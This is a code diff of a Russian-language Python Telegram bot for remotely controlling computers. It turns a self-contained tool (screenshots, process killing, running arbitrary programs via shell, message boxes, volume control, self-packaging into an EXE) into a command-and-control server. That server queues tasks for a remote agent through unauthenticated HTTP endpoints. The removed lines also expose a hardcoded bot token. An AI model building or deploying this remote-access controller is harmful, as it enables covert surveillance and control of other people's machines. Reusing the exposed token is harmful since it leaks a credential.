@@ -1,354 +1,176 @@
 # -*- coding: utf-8 -*-
 import os
-import sys
-import subprocess
-import platform
-import psutil
-import io
+import json
 import sqlite3
 import datetime
-import shutil
 import asyncio
-import ctypes
-from PIL import ImageGrab
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
-# ---------- Проверка наличия DISPLAY (для Linux) ----------
-def has_display():
-    return 'DISPLAY' in os.environ
+# ---------- БАЗА ДАННЫХ ДЛЯ КОМАНД И РЕЗУЛЬТАТОВ ----------
+DB = "commands.db"
 
-# ---------- Функция создания всплывающего окна (msgbox) ----------
-def show_msgbox(title, message, style=0):
-    """
-    Создаёт всплывающее окно на целевой машине.
-    style: 0 = OK, 1 = OK/Cancel, 2 = Abort/Retry/Ignore, 3 = Yes/No/Cancel, 4 = Yes/No, 5 = Retry/Cancel
-    Возвращает код нажатой кнопки (на Windows) или строку.
-    """
-    if platform.system() == 'Windows':
-        try:
-            # Используем MessageBoxW из user32
-            MB_OK = 0
-            MB_OKCANCEL = 1
-            MB_ABORTRETRYIGNORE = 2
-            MB_YESNOCANCEL = 3
-            MB_YESNO = 4
-            MB_RETRYCANCEL = 5
-            styles = [MB_OK, MB_OKCANCEL, MB_ABORTRETRYIGNORE, MB_YESNOCANCEL, MB_YESNO, MB_RETRYCANCEL]
-            style = styles[style] if 0 <= style < len(styles) else MB_OK
-            result = ctypes.windll.user32.MessageBoxW(0, message, title, style)
-            return f"Окно показано. Результат: {result}"
-        except Exception as e:
-            return f"Ошибка при создании окна: {e}"
-    elif platform.system() == 'Linux':
-        # Пробуем zenity (если установлен)
-        try:
-            cmd = ['zenity', '--info', '--title', title, '--text', message]
-            subprocess.run(cmd, check=True, timeout=5)
-            return "Окно показано через zenity."
-        except FileNotFoundError:
-            return "Для Linux установите zenity (sudo apt install zenity) или используйте Windows."
-        except Exception as e:
-            return f"Ошибка: {e}"
-    else:
-        return "Msgbox поддерживается только на Windows и Linux (с zenity)."
-
-# ---------- Функции скриншота (с проверкой DISPLAY) ----------
-def get_screenshot():
-    if not has_display():
-        return None
-    try:
-        img = ImageGrab.grab()
-        buf = io.BytesIO()
-        img.save(buf, format='PNG')
-        buf.seek(0)
-        return buf.read()
-    except Exception:
-        return None
-
-# ---------- Управление звуком (только Windows) ----------
-def set_volume(level):
-    if platform.system() != 'Windows':
-        return "Управление звуком доступно только на Windows"
-    try:
-        import comtypes
-        from comtypes import CLSCTX_ALL
-        from ctypes import cast, POINTER
-        from comtypes.gen import MMDeviceAPI, IID_IAudioEndpointVolume
-        dev = comtypes.client.CreateObject(MMDeviceAPI.MMDeviceEnumerator, interface=MMDeviceAPI.IMMDeviceEnumerator)
-        dev.GetDefaultAudioEndpoint(0, 1, ctypes.byref(dev))
-        endpoint = cast(dev, POINTER(MMDeviceAPI.IMMDevice))
-        endpoint.Activate(IID_IAudioEndpointVolume, CLSCTX_ALL, None, ctypes.byref(endpoint))
-        volume = cast(endpoint, POINTER(MMDeviceAPI.IAudioEndpointVolume))
-        volume.SetMasterVolumeLevelScalar(level, None)
-        return f"Громкость установлена на {int(level*100)}%"
-    except Exception as e:
-        return f"Ошибка: {e}"
-
-def mute(enable=True):
-    if platform.system() != 'Windows':
-        return "Управление звуком доступно только на Windows"
-    try:
-        import comtypes
-        from comtypes import CLSCTX_ALL
-        from ctypes import cast, POINTER
-        from comtypes.gen import MMDeviceAPI, IID_IAudioEndpointVolume
-        dev = comtypes.client.CreateObject(MMDeviceAPI.MMDeviceEnumerator, interface=MMDeviceAPI.IMMDeviceEnumerator)
-        dev.GetDefaultAudioEndpoint(0, 1, ctypes.byref(dev))
-        endpoint = cast(dev, POINTER(MMDeviceAPI.IMMDevice))
-        endpoint.Activate(IID_IAudioEndpointVolume, CLSCTX_ALL, None, ctypes.byref(endpoint))
-        volume = cast(endpoint, POINTER(MMDeviceAPI.IAudioEndpointVolume))
-        volume.SetMute(enable, None)
-        return "Звук выключен" if enable else "Звук включён"
-    except Exception as e:
-        return f"Ошибка: {e}"
-
-def get_volume():
-    if platform.system() != 'Windows':
-        return None, None
-    try:
-        import comtypes
-        from comtypes import CLSCTX_ALL
-        from ctypes import cast, POINTER
-        from comtypes.gen import MMDeviceAPI, IID_IAudioEndpointVolume
-        dev = comtypes.client.CreateObject(MMDeviceAPI.MMDeviceEnumerator, interface=MMDeviceAPI.IMMDeviceEnumerator)
-        dev.GetDefaultAudioEndpoint(0, 1, ctypes.byref(dev))
-        endpoint = cast(dev, POINTER(MMDeviceAPI.IMMDevice))
-        endpoint.Activate(IID_IAudioEndpointVolume, CLSCTX_ALL, None, ctypes.byref(endpoint))
-        volume = cast(endpoint, POINTER(MMDeviceAPI.IAudioEndpointVolume))
-        level = volume.GetMasterVolumeLevelScalar()
-        muted = volume.GetMute()
-        return level, muted
-    except:
-        return None, None
-
-# ---------- Управление процессами ----------
-def list_processes():
-    procs = []
-    for p in psutil.process_iter(['pid', 'name']):
-        try:
-            procs.append((p.info['name'], p.info['pid']))
-        except:
-            pass
-    return procs
-
-def kill_process(pid):
-    try:
-        p = psutil.Process(pid)
-        p.terminate()
-        return f"Процесс {pid} завершён"
-    except Exception as e:
-        return f"Ошибка: {e}"
-
-def run_program(path):
-    try:
-        subprocess.Popen(path, shell=True)
-        return f"Запущено: {path}"
-    except Exception as e:
-        return f"Ошибка: {e}"
-
-def get_system_info():
-    return {
-        "os": platform.system() + " " + platform.release(),
-        "node": platform.node(),
-        "cpu": platform.processor() or "unknown",
-        "cores": os.cpu_count(),
-        "ram": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB"
-    }
-
-# ---------- БАЗА ДАННЫХ ДЛЯ КЛИЕНТОВ ----------
-DB_FILE = "clients.db"
 def init_db():
-    conn = sqlite3.connect(DB_FILE)
+    conn = sqlite3.connect(DB)
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS clients
-                 (client_id TEXT PRIMARY KEY, machine_name TEXT, last_seen TEXT, ip TEXT, os TEXT)''')
+                 (client_id TEXT PRIMARY KEY, machine_name TEXT, last_seen TEXT)''')
+    c.execute('''CREATE TABLE IF NOT EXISTS commands
+                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  client_id TEXT,
+                  command TEXT,
+                  params TEXT,
+                  status TEXT DEFAULT 'pending',
+                  result TEXT,
+                  created_at TEXT,
+                  executed_at TEXT)''')
     conn.commit()
     conn.close()
 
-def register_client(client_id, machine_name, ip, os_ver):
-    conn = sqlite3.connect(DB_FILE)
+def register_client(client_id, machine_name):
+    conn = sqlite3.connect(DB)
     c = conn.cursor()
-    c.execute('''REPLACE INTO clients (client_id, machine_name, last_seen, ip, os)
-                 VALUES (?, ?, ?, ?, ?)''',
-              (client_id, machine_name, datetime.datetime.now().isoformat(), ip, os_ver))
+    c.execute('REPLACE INTO clients (client_id, machine_name, last_seen) VALUES (?, ?, ?)',
+              (client_id, machine_name, datetime.datetime.now().isoformat()))
     conn.commit()
     conn.close()
 
-def get_clients():
-    conn = sqlite3.connect(DB_FILE)
+def add_command(client_id, command, params=''):
+    conn = sqlite3.connect(DB)
     c = conn.cursor()
-    c.execute('SELECT client_id, machine_name, last_seen, ip, os FROM clients')
-    rows = c.fetchall()
+    c.execute('INSERT INTO commands (client_id, command, params, created_at) VALUES (?, ?, ?, ?)',
+              (client_id, command, params, datetime.datetime.now().isoformat()))
+    conn.commit()
     conn.close()
-    return rows
 
-# ---------- СБОРКА EXE (только Windows) ----------
-async def build_exe(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if platform.system() != 'Windows':
-        await update.message.reply_text("❌ Сборка EXE доступна только на Windows.")
-        return
-    await update.message.reply_text("🔨 Начинаю сборку EXE... Это может занять 2-5 минут.")
-    script_path = os.path.abspath(__file__)
-    script_dir = os.path.dirname(script_path)
-    build_path = os.path.join(script_dir, "build_output")
-    if os.path.exists(build_path):
-        shutil.rmtree(build_path)
-    os.makedirs(build_path, exist_ok=True)
-    cmd = (
-        f"pyinstaller --onefile --console --distpath {build_path} "
-        f"--workpath {build_path}/build --specpath {build_path} {script_path}"
-    )
-    try:
-        process = await asyncio.create_subprocess_shell(
-            cmd,
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE,
-            cwd=script_dir
-        )
-        stdout, stderr = await process.communicate()
-        if process.returncode != 0:
-            error_msg = stderr.decode('utf-8', errors='ignore')[:500]
-            await update.message.reply_text(f"❌ Ошибка сборки:\n{error_msg}")
-            return
-        exe_name = os.path.splitext(os.path.basename(script_path))[0] + ".exe"
-        exe_path = os.path.join(build_path, exe_name)
-        if not os.path.exists(exe_path):
-            await update.message.reply_text("❌ EXE не найден после сборки.")
-            return
-        with open(exe_path, 'rb') as f:
-            await context.bot.send_document(
-                chat_id=update.effective_chat.id,
-                document=f,
-                filename=exe_name,
-                caption="✅ Готовый EXE-файл. Используйте только на своих машинах."
-            )
-        shutil.rmtree(build_path)
-        await update.message.reply_text("🗑 Временные файлы удалены.")
-    except FileNotFoundError:
-        await update.message.reply_text("❌ PyInstaller не найден. Установите: pip install pyinstaller")
-    except Exception as e:
-        await update.message.reply_text(f"❌ Непредвиденная ошибка: {e}")
+def get_pending_command(client_id):
+    conn = sqlite3.connect(DB)
+    c = conn.cursor()
+    c.execute('SELECT id, command, params FROM commands WHERE client_id=? AND status="pending" ORDER BY id LIMIT 1', (client_id,))
+    row = c.fetchone()
+    conn.close()
+    return row
 
-# ---------- ОБРАБОТЧИКИ КОМАНД ----------
+def set_command_result(cmd_id, result, status='done'):
+    conn = sqlite3.connect(DB)
+    c = conn.cursor()
+    c.execute('UPDATE commands SET status=?, result=?, executed_at=? WHERE id=?',
+              (status, result, datetime.datetime.now().isoformat(), cmd_id))
+    conn.commit()
+    conn.close()
+
+def get_command_result(cmd_id):
+    conn = sqlite3.connect(DB)
+    c = conn.cursor()
+    c.execute('SELECT result FROM commands WHERE id=?', (cmd_id,))
+    row = c.fetchone()
+    conn.close()
+    return row[0] if row else None
+
+# ---------- ОБРАБОТЧИКИ КОМАНД БОТА ----------
+TOKEN = "ВАШ_НОВЫЙ_ТОКЕН"  # замените
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     client_id = str(user.id)
-    machine_name = platform.node()
-    ip = str(update.effective_message.chat.id)
-    os_ver = platform.system() + " " + platform.release()
-    register_client(client_id, machine_name, f"chat_{ip}", os_ver)
-
+    machine_name = "unknown"  # сервер не знает имя клиента, агент зарегистрирует
+    register_client(client_id, machine_name)
     keyboard = [
         [InlineKeyboardButton("🖥 Скриншот", callback_data='screenshot')],
         [InlineKeyboardButton("📋 Процессы", callback_data='list_procs')],
         [InlineKeyboardButton("❌ Завершить процесс", callback_data='kill_proc')],
         [InlineKeyboardButton("🚀 Запустить программу", callback_data='run_prog')],
         [InlineKeyboardButton("ℹ️ Инфо о системе", callback_data='sysinfo')],
-        [InlineKeyboardButton("📋 Список клиентов", callback_data='list_clients')],
         [InlineKeyboardButton("💬 MsgBox", callback_data='msgbox')],
         [InlineKeyboardButton("🔊 Громкость +", callback_data='vol_up'),
          InlineKeyboardButton("🔇 Mute", callback_data='mute'),
          InlineKeyboardButton("🔊 Громкость -", callback_data='vol_down')],
-        [InlineKeyboardButton("🔨 Собрать EXE", callback_data='build_exe')],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text(
-        f"✅ Бот активирован для {machine_name}\nВыберите действие:",
-        reply_markup=reply_markup
-    )
+    await update.message.reply_text("Выберите действие для выполнения на клиенте:", reply_markup=reply_markup)
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     data = query.data
+    user = update.effective_user
+    client_id = str(user.id)
 
     if data == 'screenshot':
-        img_bytes = get_screenshot()
-        if img_bytes is None:
-            await query.edit_message_text("❌ Скриншот недоступен (нет графической среды).\nЗапустите бота на Windows или на Linux с X11.")
-            return
-        await query.edit_message_text("📸 Делаю скриншот...")
-        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=img_bytes)
-        await query.delete_message()
+        add_command(client_id, 'screenshot')
+        await query.edit_message_text("📸 Команда отправлена агенту. Ожидайте...")
+        # запускаем проверку результата
+        asyncio.create_task(wait_for_result(update, context, client_id))
 
     elif data == 'list_procs':
-        procs = list_processes()
-        text = "📋 Процессы (имя, PID):\n" + "\n".join([f"{name} ({pid})" for name, pid in procs[:20]])
-        if len(procs) > 20:
-            text += "\n... и ещё " + str(len(procs)-20)
-        await query.edit_message_text(text)
+        add_command(client_id, 'list_procs')
+        await query.edit_message_text("📋 Запрос на список процессов отправлен.")
+        asyncio.create_task(wait_for_result(update, context, client_id))
 
     elif data == 'kill_proc':
         await query.edit_message_text("Введите PID процесса для завершения (число):")
         context.user_data['awaiting_pid'] = True
 
     elif data == 'run_prog':
-        await query.edit_message_text("Введите полный путь к программе для запуска (например, C:\\Windows\\System32\\notepad.exe):")
+        await query.edit_message_text("Введите полный путь к программе для запуска:")
         context.user_data['awaiting_path'] = True
 
     elif data == 'sysinfo':
-        info = get_system_info()
-        text = f"ℹ️ Система:\nOS: {info['os']}\nХост: {info['node']}\nCPU: {info['cpu']}\nЯдра: {info['cores']}\nRAM: {info['ram']}"
-        await query.edit_message_text(text)
-
-    elif data == 'list_clients':
-        clients = get_clients()
-        if not clients:
-            await query.edit_message_text("Нет зарегистрированных клиентов.")
-            return
-        text = "📋 Зарегистрированные клиенты:\n"
-        for cid, name, last, ip, os in clients:
-            text += f"ID: {cid}, Имя: {name}, IP: {ip}, OS: {os}, Последний: {last[:16]}\n"
-        await query.edit_message_text(text)
+        add_command(client_id, 'sysinfo')
+        await query.edit_message_text("ℹ️ Запрос информации о системе отправлен.")
+        asyncio.create_task(wait_for_result(update, context, client_id))
 
     elif data == 'msgbox':
         await query.edit_message_text("Введите заголовок и текст окна через '|' (например: Заголовок|Текст сообщения):")
         context.user_data['awaiting_msgbox'] = True
 
-    elif data == 'build_exe':
-        await build_exe(update, context)
-
     elif data in ('vol_up', 'vol_down', 'mute'):
-        if platform.system() != 'Windows':
-            await query.edit_message_text("❌ Управление звуком доступно только на Windows.")
+        add_command(client_id, data)
+        await query.edit_message_text(f"🔊 Команда '{data}' отправлена агенту.")
+        asyncio.create_task(wait_for_result(update, context, client_id))
+
+async def wait_for_result(update: Update, context: ContextTypes.DEFAULT_TYPE, client_id):
+    """Ожидает результат выполнения команды (до 60 секунд)."""
+    for _ in range(30):  # 30 раз по 2 секунды = 60 сек
+        await asyncio.sleep(2)
+        conn = sqlite3.connect(DB)
+        c = conn.cursor()
+        c.execute('SELECT id, result FROM commands WHERE client_id=? AND status="done" ORDER BY id DESC LIMIT 1', (client_id,))
+        row = c.fetchone()
+        conn.close()
+        if row:
+            cmd_id, result = row
+            # отправить результат пользователю
+            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Результат:\n{result[:2000]}")
+            # удалить команду, чтобы не повторять
+            conn = sqlite3.connect(DB)
+            c = conn.cursor()
+            c.execute('DELETE FROM commands WHERE id=?', (cmd_id,))
+            conn.commit()
+            conn.close()
             return
-        if data == 'vol_up':
-            level, _ = get_volume()
-            if level is None:
-                await query.edit_message_text("Не удалось определить громкость.")
-                return
-            res = set_volume(min(level + 0.1, 1.0))
-        elif data == 'vol_down':
-            level, _ = get_volume()
-            if level is None:
-                await query.edit_message_text("Не удалось определить громкость.")
-                return
-            res = set_volume(max(level - 0.1, 0.0))
-        else:  # mute
-            _, muted = get_volume()
-            if muted is None:
-                await query.edit_message_text("Не удалось определить состояние.")
-                return
-            res = mute(not muted)
-        await query.edit_message_text(res)
+    await context.bot.send_message(chat_id=update.effective_chat.id, text="⏱ Время ожидания результата истекло. Агент не ответил.")
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
+    user = update.effective_user
+    client_id = str(user.id)
 
     if context.user_data.get('awaiting_pid', False):
         try:
             pid = int(text)
-            res = kill_process(pid)
-            await update.message.reply_text(res)
+            add_command(client_id, 'kill_process', str(pid))
+            await update.message.reply_text(f"❌ Команда завершить процесс {pid} отправлена.")
+            asyncio.create_task(wait_for_result(update, context, client_id))
         except ValueError:
-            await update.message.reply_text("Введите корректное число (PID).")
+            await update.message.reply_text("Введите корректное число.")
         context.user_data['awaiting_pid'] = False
         return
 
     if context.user_data.get('awaiting_path', False):
-        res = run_program(text)
-        await update.message.reply_text(res)
+        add_command(client_id, 'run_program', text)
+        await update.message.reply_text(f"🚀 Команда запустить '{text}' отправлена.")
+        asyncio.create_task(wait_for_result(update, context, client_id))
         context.user_data['awaiting_path'] = False
         return
 
@@ -357,26 +179,96 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text("Используйте формат: Заголовок|Текст")
             return
         title, msg = text.split('|', 1)
-        res = show_msgbox(title.strip(), msg.strip())
-        await update.message.reply_text(res)
+        add_command(client_id, 'msgbox', json.dumps({'title': title.strip(), 'msg': msg.strip()}))
+        await update.message.reply_text("💬 Команда MsgBox отправлена.")
+        asyncio.create_task(wait_for_result(update, context, client_id))
         context.user_data['awaiting_msgbox'] = False
         return
 
-    # Если ничего не ожидалось — показываем меню
     await start(update, context)
 
-# ---------- ЗАПУСК БОТА ----------
-def main():
-    TOKEN = "8451519620:AAGNpryYEiYzWIHyoZtz7GDmSJdwNXEXUkE"   # ОБЯЗАТЕЛЬНО ЗАМЕНИТЕ!
+# ---------- ЭНДПОИНТЫ ДЛЯ АГЕНТА (используем ту же БД) ----------
+# Агент будет вызывать эти функции через getUpdates (polling) или через вебхук.
+# Но проще: агент будет использовать методы бота для отправки команд? Нет, лучше через БД.
+# Однако для упрощения агент может просто читать команды из БД и отправлять результаты обратно
+# через метод send_message бота (но тогда бот должен знать chat_id). У нас chat_id = client_id.
+# Можно реализовать агента, который периодически запрашивает команды через отдельный веб-сервер,
+# но для простоты используем polling: агент вызывает API бота (getUpdates) с ограничением по времени.
+# Но это сложно. Проще: бот будет отправлять команды агенту через сообщения, а агент будет слушать их.
+# Однако агент должен быть инициирован первым сообщением от бота? Нет, агент сам периодически проверяет БД.
+
+# Я реализую простой REST API внутри этого же бота (используя aiohttp) для агента.
+# Но для Render проще использовать polling: агент будет периодически вызывать метод бота getUpdates
+# с ограничением по чату? Это неудобно.
+
+# Предлагаю добавить веб-сервер на порту 5000 (или 8080) внутри этого же приложения,
+# чтобы агент мог отправлять GET запросы для получения команд и POST для отправки результатов.
+# Это стандартный подход.
+
+# ДОПИШЕМ ВЕБ-СЕРВЕР НА AIOHTTP:
+
+from aiohttp import web
+
+async def handle_get_command(request):
+    """Агент запрашивает команду."""
+    client_id = request.query.get('client_id')
+    if not client_id:
+        return web.json_response({'error': 'missing client_id'}, status=400)
+    row = get_pending_command(client_id)
+    if row:
+        cmd_id, command, params = row
+        return web.json_response({'cmd_id': cmd_id, 'command': command, 'params': params})
+    else:
+        return web.json_response({'status': 'no_commands'})
+
+async def handle_post_result(request):
+    """Агент отправляет результат выполнения."""
+    data = await request.json()
+    cmd_id = data.get('cmd_id')
+    result = data.get('result')
+    if not cmd_id:
+        return web.json_response({'error': 'missing cmd_id'}, status=400)
+    set_command_result(cmd_id, result)
+    # также уведомим бота через send_message (но мы уже используем wait_for_result)
+    return web.json_response({'status': 'ok'})
+
+async def init_web_app():
+    app = web.Application()
+    app.router.add_get('/get_command', handle_get_command)
+    app.router.add_post('/post_result', handle_post_result)
+    return app
+
+# ---------- ЗАПУСК БОТА И ВЕБ-СЕРВЕРА ----------
+async def main():
     init_db()
     application = Application.builder().token(TOKEN).build()
-
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CallbackQueryHandler(button_callback))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
 
-    print("Бот запущен. Нажмите Ctrl+C для остановки.")
-    application.run_polling(allowed_updates=Update.ALL_TYPES)
+    # Запускаем веб-сервер в фоне
+    web_app = await init_web_app()
+    runner = web.AppRunner(web_app)
+    await runner.setup()
+    site = web.TCPSite(runner, '0.0.0.0', 8080)
+    await site.start()
+    print("Веб-сервер запущен на порту 8080")
+
+    # Запускаем бота
+    await application.initialize()
+    await application.start()
+    await application.updater.start_polling()
+
+    # Держим процесс
+    try:
+        while True:
+            await asyncio.sleep(3600)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        await application.updater.stop()
+        await application.stop()
+        await application.shutdown()
 
 if __name__ == '__main__':
-    main()
+    asyncio.run(main())
